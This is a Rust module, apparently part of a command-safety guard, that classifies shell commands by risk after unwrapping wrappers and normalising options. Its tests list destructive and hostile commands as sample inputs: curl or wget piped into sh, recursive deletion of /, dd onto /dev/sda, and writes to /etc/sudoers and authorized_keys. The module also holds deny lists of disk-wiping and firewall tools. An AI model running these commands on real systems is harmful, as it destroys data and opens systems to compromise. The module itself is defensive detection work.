//! Token-level hardening layered over `core::classify_risk`.
//!
//! `classify_risk` leans on `lower.contains("...")` substring checks, which an
//! equivalent spelling walks straight past: `rm --recursive --force /`,
//! `systemctl  stop sshd` (two spaces), `dd of="/dev/sda"`, `bash -c "rm -rf /"`,
//! `curl … | sh`. This module closes those gaps by working on shell *words*
//! (quotes removed, long/short options normalised) instead of raw text:
//!
//! - wrappers that hide a command inside a string (`sh -c`, `eval`,
//!   `find -exec`) are unwrapped and the inner command is classified again;
//! - a pipeline that feeds a shell interpreter (`… | sh`) is High;
//! - `rm`, `dd`, `systemctl`, `chmod`, firewall and block-device writers are
//!   judged from their parsed arguments.
//!
//! It can only **escalate**: the caller keeps the strictest of its own result and
//! this one, so nothing that was previously Blocked/High can become weaker.

use crate::sanitize::{analyze_command, split_commands};
use crate::types::RiskLevel;

/// Bound on `sh -c '… sh -c '…''` nesting; deeper than this is treated as an
/// evasion attempt rather than followed further.
pub(crate) const MAX_DEPTH: usize = 4;

const SHELLS: &[&str] = &[
    "sh", "bash", "zsh", "dash", "ksh", "ash", "fish", "csh", "tcsh",
];

const INLINE_INTERPRETERS: &[&str] = &[
    "python", "python2", "python3", "perl", "ruby", "node", "php",
];

/// Substrings that make inline interpreter code (`python -c …`) destructive or
/// able to spawn arbitrary processes.
const INLINE_CODE_DANGER: &[&str] = &[
    "rmtree",
    "os.remove",
    "os.unlink",
    "os.rmdir",
    "unlink",
    "rmdir",
    "os.system",
    "subprocess",
    "popen",
    "child_process",
    "fs.rm",
    "system(",
    "exec(",
    "eval(",
    "`",
];

const BLOCK_DEVICE_PREFIXES: &[&str] = &[
    "/dev/sd",
    "/dev/hd",
    "/dev/vd",
    "/dev/xvd",
    "/dev/nvme",
    "/dev/disk",
    "/dev/md",
    "/dev/mapper",
    "/dev/dm-",
    "/dev/loop",
    "/dev/mmcblk",
];

/// Top-level system directories whose recursive removal or relocation is
/// treated as High regardless of flags.
const PROTECTED_DIRS: &[&str] = &[
    "/bin", "/boot", "/etc", "/home", "/lib", "/lib64", "/root", "/sbin", "/usr", "/var",
];

const SYSTEM_WRITE_PREFIXES: &[&str] = &[
    "/etc/", "/boot/", "/proc/", "/sys/", "/usr/", "/bin/", "/sbin/", "/lib/", "/lib64/",
];

/// Classify `command` from its parsed words. `recurse` classifies a nested
/// command (the body of `sh -c`, `eval`, `find -exec`) at `depth + 1`.
pub(crate) fn classify_extra(
    command: &str,
    depth: usize,
    recurse: &dyn Fn(&str, usize) -> RiskLevel,
) -> RiskLevel {
    if depth >= MAX_DEPTH {
        // Followed far enough; anything still nesting is hiding something.
        return RiskLevel::High;
    }

    let mut risk = classify_sql(command);
    let segments = split_commands(command);
    let has_pipe = command.contains('|');

    for segment in &segments {
        risk = risk.max_severity(classify_segment(segment, has_pipe, depth, recurse));
    }
    risk
}

fn classify_sql(command: &str) -> RiskLevel {
    // Whitespace-collapsed so `DROP   TABLE` matches the single-space pattern.
    let collapsed = command
        .to_lowercase()
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ");
    const DESTRUCTIVE: &[&str] = &[
        "drop table",
        "drop database",
        "drop schema",
        "truncate table",
    ];
    if DESTRUCTIVE.iter().any(|pat| collapsed.contains(pat)) {
        RiskLevel::High
    } else {
        RiskLevel::Low
    }
}

fn classify_segment(
    segment: &str,
    has_pipe: bool,
    depth: usize,
    recurse: &dyn Fn(&str, usize) -> RiskLevel,
) -> RiskLevel {
    let words = shell_words(segment);
    // `$cmd -rf /`, `$(echo rm) -rf /`: the program is only known at run time,
    // so nothing about its arguments can be trusted. (The AST head extractor
    // skips such a word and reports the first flag instead, so look at the raw
    // first word ourselves.)
    if words
        .iter()
        .find(|w| !is_assignment(w))
        .is_some_and(|w| w.contains('$') || w.contains('`'))
    {
        return RiskLevel::High;
    }
    let analysis = analyze_command(segment);
    let Some(head) = analysis.canonical_head else {
        return RiskLevel::Low; // fail-closed handling already lives in the caller
    };
    let Some(idx) = words.iter().position(|w| name_matches(w, &head)) else {
        return RiskLevel::Low;
    };
    let args: Vec<&str> = words[idx + 1..].iter().map(String::as_str).collect();
    let head = head.as_str();

    if SHELLS.contains(&head) {
        return classify_shell(&args, has_pipe, depth, recurse);
    }
    if INLINE_INTERPRETERS
        .iter()
        .any(|name| head == *name || head.starts_with(&format!("{name}3")))
    {
        return classify_inline_interpreter(&args);
    }

    match head {
        "eval" => classify_eval(&args, depth, recurse),
        "find" => classify_find(&args, depth, recurse),
        "rm" => classify_rm(&args),
        "mv" => classify_mv(&args),
        "dd" => classify_dd(&args),
        "tee" | "cp" | "install" | "ln" => classify_file_writer(head, &args),
        "shred" | "wipefs" | "blkdiscard" | "sfdisk" | "sgdisk" | "fdisk" | "parted" | "mkswap"
        | "truncate" => classify_disk_tool(head, &args),
        "systemctl" => classify_systemctl(&args),
        "service" => {
            if args.iter().any(|a| a.eq_ignore_ascii_case("stop")) {
                RiskLevel::High
            } else {
                RiskLevel::Low
            }
        }
        "iptables" | "ip6tables" | "nft" | "ufw" | "firewall-cmd" => classify_firewall(head, &args),
        "chmod" => classify_chmod(&args),
        "crontab" => {
            if args.contains(&"-r") {
                RiskLevel::High
            } else {
                RiskLevel::Low
            }
        }
        "chattr" => RiskLevel::Medium,
        _ => RiskLevel::Low,
    }
}

fn classify_shell(
    args: &[&str],
    has_pipe: bool,
    depth: usize,
    recurse: &dyn Fn(&str, usize) -> RiskLevel,
) -> RiskLevel {
    // `bash -c 'cmd'`, `bash -lc 'cmd'`: classify the inner command.
    if let Some(pos) = args
        .iter()
        .position(|a| a.starts_with('-') && !a.starts_with("--") && a[1..].contains('c'))
    {
        return match args.get(pos + 1) {
            Some(inner) => recurse(inner, depth + 1),
            None => RiskLevel::Low,
        };
    }
    // No `-c`: the shell reads a script. From a pipe, or from stdin, that script
    // is whatever the previous stage produced and cannot be inspected.
    let reads_stdin = args.iter().all(|a| a.starts_with('-')) || args.contains(&"-s");
    let stdin_path = args
        .iter()
        .any(|a| *a == "/dev/stdin" || a.starts_with("/dev/fd/"));
    if (has_pipe && reads_stdin) || stdin_path {
        return RiskLevel::High;
    }
    RiskLevel::Low
}

fn classify_eval(
    args: &[&str],
    depth: usize,
    recurse: &dyn Fn(&str, usize) -> RiskLevel,
) -> RiskLevel {
    if args.is_empty() {
        return RiskLevel::Low;
    }
    let joined = args.join(" ");
    if joined.contains('$') || joined.contains('`') {
        return RiskLevel::High; // the evaluated text isn't known statically
    }
    recurse(&joined, depth + 1)
}

fn classify_inline_interpreter(args: &[&str]) -> RiskLevel {
    let Some(pos) = args
        .iter()
        .position(|a| matches!(*a, "-c" | "-e" | "-E" | "-r" | "--eval" | "--command"))
    else {
        return RiskLevel::Low;
    };
    let code = args.get(pos + 1).copied().unwrap_or("").to_lowercase();
    if INLINE_CODE_DANGER.iter().any(|pat| code.contains(pat)) {
        RiskLevel::High
    } else {
        RiskLevel::Medium
    }
}

fn classify_find(
    args: &[&str],
    depth: usize,
    recurse: &dyn Fn(&str, usize) -> RiskLevel,
) -> RiskLevel {
    let mut risk = RiskLevel::Low;
    if args.contains(&"-delete") {
        risk = RiskLevel::High;
    }
    let mut i = 0;
    while i < args.len() {
        if matches!(args[i], "-exec" | "-execdir" | "-ok" | "-okdir") {
            let inner: Vec<&str> = args[i + 1..]
                .iter()
                .copied()
                .take_while(|a| !matches!(*a, ";" | "+" | "\\;"))
                .collect();
            i += inner.len() + 1;
            let inner = inner
                .iter()
                .map(|w| shell_quote(w))
                .collect::<Vec<_>>()
                .join(" ");
            risk = risk
                .max_severity(RiskLevel::Medium)
                .max_severity(recurse(&inner, depth + 1));
        }
        i += 1;
    }
    risk
}

fn classify_rm(args: &[&str]) -> RiskLevel {
    let opts = split_options(args);
    let recursive =
        opts.short.contains(&'r') || opts.short.contains(&'R') || opts.long.contains(&"recursive");
    let no_preserve_root = opts.long.contains(&"no-preserve-root");

    if recursive && (no_preserve_root || opts.positional.iter().any(|p| is_root_target(p))) {
        return RiskLevel::Blocked;
    }
    if recursive {
        return RiskLevel::High;
    }
    RiskLevel::Low
}

fn classify_mv(args: &[&str]) -> RiskLevel {
    let opts = split_options(args);
    if opts.positional.iter().any(|p| is_protected_target(p)) {
        RiskLevel::High
    } else {
        RiskLevel::Low
    }
}

fn classify_dd(args: &[&str]) -> RiskLevel {
    let writes_device = args
        .iter()
        .filter_map(|a| a.strip_prefix("of="))
        .any(is_block_device);
    if writes_device {
        RiskLevel::Blocked
    } else {
        RiskLevel::Low
    }
}

fn classify_file_writer(head: &str, args: &[&str]) -> RiskLevel {
    let opts = split_options(args);
    if opts.positional.iter().any(|p| is_block_device(p)) && head != "ln" {
        return RiskLevel::Blocked;
    }
    let touches_system = opts.positional.iter().any(|p| {
        let p = p.to_lowercase();
        SYSTEM_WRITE_PREFIXES.iter().any(|pre| p.starts_with(pre)) || p.ends_with("authorized_keys")
    });
    // `cp`/`ln` read their sources, so a system path is only a write when it is
    // a destination; keep `tee`/`install` (always writes) strict and don't
    // escalate copies *from* /etc.
    if touches_system && matches!(head, "tee" | "install") {
        return RiskLevel::High;
    }
    if matches!(head, "cp" | "ln")
        && opts
            .positional
            .last()
            .is_some_and(|dest| is_system_destination(dest))
    {
        return RiskLevel::High;
    }
    RiskLevel::Low
}

fn classify_disk_tool(head: &str, args: &[&str]) -> RiskLevel {
    let opts = split_options(args);
    let on_device = opts.positional.iter().any(|p| is_block_device(p));
    match head {
        "fdisk" | "parted" => {
            if on_device {
                RiskLevel::High
            } else {
                RiskLevel::Low
            }
        }
        "wipefs" => {
            if on_device && (opts.short.contains(&'a') || opts.long.contains(&"all")) {
                RiskLevel::Blocked
            } else if opts.short.contains(&'a')
                || opts.short.contains(&'f')
                || opts.long.iter().any(|o| matches!(*o, "all" | "force"))
            {
                RiskLevel::High
            } else {
                RiskLevel::Low
            }
        }
        "shred" => {
            if on_device {
                RiskLevel::Blocked
            } else {
                RiskLevel::High
            }
        }
        // `truncate` is already Medium upstream; only a device target changes it.
        "truncate" => {
            if on_device {
                RiskLevel::Blocked
            } else {
                RiskLevel::Low
            }
        }
        _ => {
            if on_device {
                RiskLevel::Blocked
            } else {
                RiskLevel::Low
            }
        }
    }
}

fn classify_systemctl(args: &[&str]) -> RiskLevel {
    let verb = args.iter().find(|a| !a.starts_with('-'));
    match verb.map(|v| v.to_lowercase()).as_deref() {
        Some("stop" | "kill" | "mask") => RiskLevel::High,
        Some("poweroff" | "halt" | "reboot" | "kexec") => RiskLevel::Blocked,
        _ => RiskLevel::Low,
    }
}

fn classify_firewall(head: &str, args: &[&str]) -> RiskLevel {
    let lowered: Vec<String> = args.iter().map(|a| a.to_lowercase()).collect();
    let has = |needle: &str| lowered.iter().any(|a| a == needle);
    let destructive = match head {
        "iptables" | "ip6tables" => {
            has("-f") || has("--flush") || has("-x") || has("--delete-chain") || has("-p")
        }
        "nft" => has("flush"),
        "ufw" => has("disable") || has("reset"),
        "firewall-cmd" => has("--panic-on") || has("--remove-service") || has("--remove-port"),
        _ => false,
    };
    if destructive {
        RiskLevel::High
    } else {
        RiskLevel::Low
    }
}

fn classify_chmod(args: &[&str]) -> RiskLevel {
    let opts = split_options(args);
    let recursive = opts.short.contains(&'R') || opts.long.contains(&"recursive");
    // Symbolic modes such as `-x` look like options; scan the raw args for a mode.
    let mode = args
        .iter()
        .find(|a| {
            a.chars()
                .next()
                .is_some_and(|c| c.is_ascii_digit() || matches!(c, 'u' | 'g' | 'o' | 'a' | '+'))
        })
        .map(|m| m.to_lowercase());
    if let Some(mode) = &mode {
        let digits = mode.trim_start_matches('0');
        if digits == "777"
            || matches!(
                mode.as_str(),
                "a+rwx" | "ugo+rwx" | "a=rwx" | "ugo=rwx" | "o+w" | "o+rwx" | "a+w"
            )
            || mode.contains("+s")
        {
            return RiskLevel::High;
        }
    }
    if recursive
        && opts
            .positional
            .iter()
            .any(|p| is_root_target(p) || is_protected_target(p))
    {
        return RiskLevel::High;
    }
    RiskLevel::Low
}

// ── word / path helpers ──────────────────────────────────────────────────────

struct Options<'a> {
    short: Vec<char>,
    long: Vec<&'a str>,
    positional: Vec<&'a str>,
}

/// Split argv into short flag letters, long option names (without `--`, value
/// stripped) and positionals. Everything after `--` is positional.
fn split_options<'a>(args: &[&'a str]) -> Options<'a> {
    let mut opts = Options {
        short: Vec::new(),
        long: Vec::new(),
        positional: Vec::new(),
    };
    let mut only_positional = false;
    for arg in args {
        if only_positional || !arg.starts_with('-') || *arg == "-" {
            opts.positional.push(arg);
        } else if *arg == "--" {
            only_positional = true;
        } else if let Some(long) = arg.strip_prefix("--") {
            opts.long.push(long.split('=').next().unwrap_or(long));
        } else {
            opts.short.extend(arg[1..].chars());
        }
    }
    opts
}

fn normalize_path(path: &str) -> String {
    let mut p = path.trim().to_lowercase();
    while p.len() > 1 && p.ends_with('/') {
        p.pop();
    }
    // `//` and `///` all mean the root directory.
    if !p.is_empty() && p.chars().all(|c| c == '/') {
        return "/".to_string();
    }
    p
}

fn is_root_target(path: &str) -> bool {
    matches!(
        normalize_path(path).as_str(),
        "/" | "/*" | "/." | "/.." | "/.*" | "/./" | "/../"
    )
}

fn is_protected_target(path: &str) -> bool {
    let p = normalize_path(path);
    let p = p.strip_suffix("/*").unwrap_or(&p);
    PROTECTED_DIRS.contains(&p) || is_root_target(path)
}

fn is_system_destination(path: &str) -> bool {
    let p = path.to_lowercase();
    SYSTEM_WRITE_PREFIXES.iter().any(|pre| p.starts_with(pre)) || p.ends_with("authorized_keys")
}

fn is_block_device(path: &str) -> bool {
    let p = path.to_lowercase();
    BLOCK_DEVICE_PREFIXES.iter().any(|pre| p.starts_with(pre))
}

/// `/usr/bin/RM` and `grm` both name `rm` once the canonical head is known.
fn name_matches(word: &str, head: &str) -> bool {
    let base = word.rsplit('/').next().unwrap_or(word).to_lowercase();
    base == head || base == format!("g{head}")
}

/// `NAME=value` prefix assignment (`LC_ALL=C ls`).
fn is_assignment(word: &str) -> bool {
    word.split_once('=').is_some_and(|(name, _)| {
        !name.is_empty()
            && !name.starts_with(|c: char| c.is_ascii_digit())
            && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
    })
}

fn shell_quote(word: &str) -> String {
    if !word.is_empty()
        && word
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "-_./=:,@%+".contains(c))
    {
        word.to_string()
    } else {
        format!("'{}'", word.replace('\'', "'\\''"))
    }
}

/// Minimal POSIX word splitter: single quotes are literal, double quotes honour
/// `\"` `\\` `\$` `` \` ``, and a bare backslash escapes the next character.
/// Operators are not interpreted — callers hand it one already-split command.
pub(crate) fn shell_words(input: &str) -> Vec<String> {
    let mut words = Vec::new();
    let mut current = String::new();
    let mut in_word = false;
    let mut chars = input.chars().peekable();

    while let Some(c) = chars.next() {
        match c {
            '\'' => {
                in_word = true;
                for q in chars.by_ref() {
                    if q == '\'' {
                        break;
                    }
                    current.push(q);
                }
            }
            '"' => {
                in_word = true;
                while let Some(q) = chars.next() {
                    match q {
                        '"' => break,
                        '\\' => match chars.peek().copied() {
                            Some(n @ ('"' | '\\' | '$' | '`')) => {
                                current.push(n);
                                chars.next();
                            }
                            _ => current.push('\\'),
                        },
                        other => current.push(other),
                    }
                }
            }
            '\\' => {
                in_word = true;
                if let Some(n) = chars.next() {
                    current.push(n);
                }
            }
            c if c.is_whitespace() => {
                if in_word {
                    words.push(std::mem::take(&mut current));
                    in_word = false;
                }
            }
            other => {
                in_word = true;
                current.push(other);
            }
        }
    }
    if in_word {
        words.push(current);
    }
    words
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::core::classify_risk;

    fn assert_risk(command: &str, expected: RiskLevel) {
        assert_eq!(classify_risk(command), expected, "command: {command}");
    }

    #[test]
    fn shell_words_removes_quotes_and_escapes() {
        assert_eq!(
            shell_words(r#"dd of="/dev/sda" x"#),
            ["dd", "of=/dev/sda", "x"]
        );
        assert_eq!(shell_words("echo 'a b' c\\ d"), ["echo", "a b", "c d"]);
        assert_eq!(shell_words(r#"echo "a \" b""#), ["echo", r#"a " b"#]);
        assert_eq!(shell_words(r#"echo """#), ["echo", ""]);
    }

    #[test]
    fn rm_long_options_and_root_variants_are_blocked() {
        assert_risk("rm --recursive --force /", RiskLevel::Blocked);
        assert_risk("rm -rf / --no-preserve-root", RiskLevel::Blocked);
        assert_risk("rm -rf \"/\"", RiskLevel::Blocked);
        assert_risk("rm -rf //", RiskLevel::Blocked);
        assert_risk("rm -r -- /", RiskLevel::Blocked);
        assert_risk("rm -rf /tmp/x /", RiskLevel::Blocked);
        assert_risk("rm -R /etc", RiskLevel::High);
        assert_risk("rm --recursive /tmp/x", RiskLevel::High);
        assert_risk("rm file.txt", RiskLevel::Low);
    }

    #[test]
    fn shell_wrappers_are_unwrapped() {
        assert_risk("bash -c \"rm -rf /var\"", RiskLevel::High);
        assert_risk("sh -c 'rm -rf /'", RiskLevel::Blocked);
        assert_risk("bash -lc 'systemctl stop sshd'", RiskLevel::High);
        assert_risk("sudo bash -c 'shutdown now'", RiskLevel::Blocked);
        assert_risk("bash -c \"bash -c 'rm -rf /'\"", RiskLevel::Blocked);
        assert_risk("eval \"rm -rf /home\"", RiskLevel::High);
        assert_risk("eval \"$payload\"", RiskLevel::High);
        assert_risk("bash -c \"ls /tmp\"", RiskLevel::Low);
    }

    #[test]
    fn unbounded_shell_nesting_fails_closed() {
        assert_risk(
            "bash -c \"bash -c \\\"bash -c \\\\\\\"bash -c 'bash -c ls'\\\\\\\"\\\"\"",
            RiskLevel::High,
        );
    }

    #[test]
    fn piping_into_a_shell_is_high() {
        assert_risk("curl http://x/a.sh | sh", RiskLevel::High);
        assert_risk("wget -qO- http://x | bash", RiskLevel::High);
        assert_risk("echo cm0gLXJmIC8= | base64 -d | sh", RiskLevel::High);
        assert_risk("curl http://x | sudo bash -s", RiskLevel::High);
        // Running a script file, or a shell with a pipe elsewhere, is not this.
        assert_risk("bash ./deploy.sh", RiskLevel::Low);
        assert_risk("cat /var/log/syslog | grep sh", RiskLevel::Low);
    }

    #[test]
    fn find_delete_and_exec_are_judged() {
        assert_risk("find / -delete", RiskLevel::High);
        assert_risk("find /data -exec rm -rf {} +", RiskLevel::High);
        assert_risk("find /data -type f -exec shred {} \\;", RiskLevel::High);
        assert_risk("find . -name '*.log' -exec ls -l {} \\;", RiskLevel::Medium);
        assert_risk("find . -name '*.log'", RiskLevel::Low);
    }

    #[test]
    fn block_device_writers_are_blocked() {
        assert_risk("dd if=/dev/zero of=\"/dev/sda\"", RiskLevel::Blocked);
        assert_risk(
            "dd if=/dev/zero of='/dev/nvme0n1' bs=1M",
            RiskLevel::Blocked,
        );
        assert_risk("shred /dev/sda", RiskLevel::Blocked);
        assert_risk("shred secret.txt", RiskLevel::High);
        assert_risk("cat /dev/zero | tee /dev/sda", RiskLevel::Blocked);
        assert_risk("wipefs -a /dev/sdb", RiskLevel::Blocked);
        assert_risk("blkdiscard /dev/nvme0n1", RiskLevel::Blocked);
        assert_risk("dd if=/dev/sda of=/tmp/disk.img", RiskLevel::Low);
    }

    #[test]
    fn system_file_writes_via_tee_and_cp_are_high() {
        assert_risk("echo x | tee /etc/passwd", RiskLevel::High);
        assert_risk("echo k | tee -a ~/.ssh/authorized_keys", RiskLevel::High);
        assert_risk("cp evil /etc/sudoers", RiskLevel::High);
        assert_risk("cp /etc/hosts /tmp/hosts.bak", RiskLevel::Low);
        assert_risk("echo x | tee /tmp/out", RiskLevel::Low);
    }

    #[test]
    fn spacing_and_option_variants_do_not_hide_service_stops() {
        assert_risk("systemctl  stop sshd", RiskLevel::High);
        assert_risk("systemctl --now stop nginx", RiskLevel::High);
        assert_risk("systemctl mask sshd", RiskLevel::High);
        assert_risk("systemctl poweroff", RiskLevel::Blocked);
        assert_risk("systemctl status sshd", RiskLevel::Low);
        assert_risk("service  nginx   stop", RiskLevel::High);
    }

    #[test]
    fn sql_and_firewall_variants_are_caught() {
        assert_risk("psql -c 'DROP  TABLE users'", RiskLevel::High);
        assert_risk("mysql -e \"drop\tdatabase prod\"", RiskLevel::High);
        assert_risk("iptables --flush", RiskLevel::High);
        assert_risk("iptables -P INPUT DROP", RiskLevel::High);
        assert_risk("nft flush ruleset", RiskLevel::High);
        assert_risk("iptables -L -n", RiskLevel::Low);
    }

    #[test]
    fn chmod_octal_and_symbolic_modes() {
        assert_risk("chmod 0777 /etc/foo", RiskLevel::High);
        assert_risk("chmod -R 0777 /", RiskLevel::High);
        assert_risk("chmod a+rwx script.sh", RiskLevel::High);
        assert_risk("chmod u+s /bin/bash", RiskLevel::High);
        assert_risk("chmod -R 755 /etc", RiskLevel::High);
        assert_risk("chmod 644 notes.txt", RiskLevel::Medium);
    }

    #[test]
    fn inline_interpreters_and_misc() {
        assert_risk(
            "python3 -c \"import shutil;shutil.rmtree('/')\"",
            RiskLevel::High,
        );
        assert_risk("perl -e 'print 1'", RiskLevel::Medium);
        assert_risk("python3 script.py", RiskLevel::Low);
        assert_risk("crontab -r", RiskLevel::High);
        assert_risk("crontab -l", RiskLevel::Low);
        assert_risk("chattr +i /etc/passwd", RiskLevel::Medium);
        assert_risk("mv /etc /etc.bak", RiskLevel::High);
        assert_risk("mv a.txt b.txt", RiskLevel::Low);
    }

    #[test]
    fn dynamic_command_heads_are_high() {
        assert_risk("r=rm; $r -rf /", RiskLevel::High);
        assert_risk("$(echo rm) -rf /tmp/x", RiskLevel::High);
        assert_risk("`echo rm` -rf /tmp/x", RiskLevel::High);
        assert_risk("echo $HOME", RiskLevel::Low);
    }

    #[test]
    fn harmless_commands_stay_low() {
        for cmd in [
            "ls -la",
            "df -h",
            "cat /etc/hosts",
            "grep -r foo /var/log",
            "ps aux | grep nginx",
            "uname -a",
            "systemctl status nginx",
            "tail -n 100 /var/log/syslog",
        ] {
            assert_risk(cmd, RiskLevel::Low);
        }
    }
}
